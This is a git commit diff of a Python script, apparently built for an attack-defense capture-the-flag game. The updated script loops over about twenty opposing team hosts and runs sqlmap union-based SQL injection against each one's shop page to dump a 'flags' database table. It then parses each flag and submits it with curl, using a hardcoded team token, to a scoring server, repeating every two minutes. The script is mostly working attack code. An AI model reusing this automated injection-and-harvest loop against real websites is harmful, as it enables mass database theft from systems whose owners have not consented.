2f115806e22c5a20d967deef0d8b4592c59913cd
trung501 <gotrungogle@gmail.com>
2022-11-05 12:30:25 +0700

    commit

--- auto_submit3.py
+++ auto_submit3.py
@@ -3,28 +3,36 @@ from time import sleep
 
     
 while True:
-    try:
-        p = subprocess.Popen("""python3 /home/ubuntu/sqlmap-dev/sqlmap.py -u "http://10.254.1.2:4001/index.php?page=shop&type=VGA" --technique=U -D vstore -T flags --dump --batch > temp_web.txt""", shell=True)
-        sleep(5)  
-    except:
-        print("error get flag")
-        sleep(5)   
+    flag=[]
+    for i in range(1,21):
+        if i==5:
+            continue
+        try:
+            p = subprocess.Popen(f"""python3 /home/ubuntu/sqlmap-dev/sqlmap.py -u "http://10.254.{i}.2:4001/index.php?page=shop&type=VGA" --technique=U -D vstore -T flags --dump --batch > temp_web.txt""", shell=True)
+            sleep(5)  
+        except:
+            print("error get flag")
+            sleep(5)   
+        with open("temp_web.txt","r") as f:
+            data=[]
+            for line in f:
+                data.append(line)
+            flag.append(data[-9])
 
 
-    with open("web.txt","r") as f:
-        lines=f.readlines()
-        for line in lines:
-            line=line.replace('|','').replace('\n','').strip()
-            try:
-                if len(line)>0 :
-                    cmd_query=f"""curl -i -s -k -X PUT -H 'Host: 10.254.0.253:8080' -H 'Accept-Encoding: gzip, deflate' """ \
-                            f"""-H 'Accept: /' -H 'Connection: close' -H 'X-Team-Token: e5902a784c4ca765' """ \
-                            f"""-H 'Content-Length: 36' -H 'Content-Type: application/json' --data-binary """  \
-                            f"""'["{line}"]' 'http://10.254.0.253:8080/flags' """
-                    print(cmd_query)
-                    p = subprocess.Popen(cmd_query, shell=True)
-                    sleep(5)
-            except:
-                print("error curl")
-                sleep(5) 
+    for line in flag:
+        print(line)
+        line=line.replace('|','').replace('\n','').strip()
+        try:
+            if len(line)>0 :
+                cmd_query=f"""curl -i -s -k -X PUT -H 'Host: 10.254.0.253:8080' -H 'Accept-Encoding: gzip, deflate' """ \
+                        f"""-H 'Accept: /' -H 'Connection: close' -H 'X-Team-Token: e5902a784c4ca765' """ \
+                        f"""-H 'Content-Length: 36' -H 'Content-Type: application/json' --data-binary """  \
+                        f"""'["{line}"]' 'http://10.254.0.253:8080/flags' """
+                print(cmd_query)
+                p = subprocess.Popen(cmd_query, shell=True)
+                sleep(5)
+        except:
+            print("error curl")
+            sleep(5) 
     sleep(120)
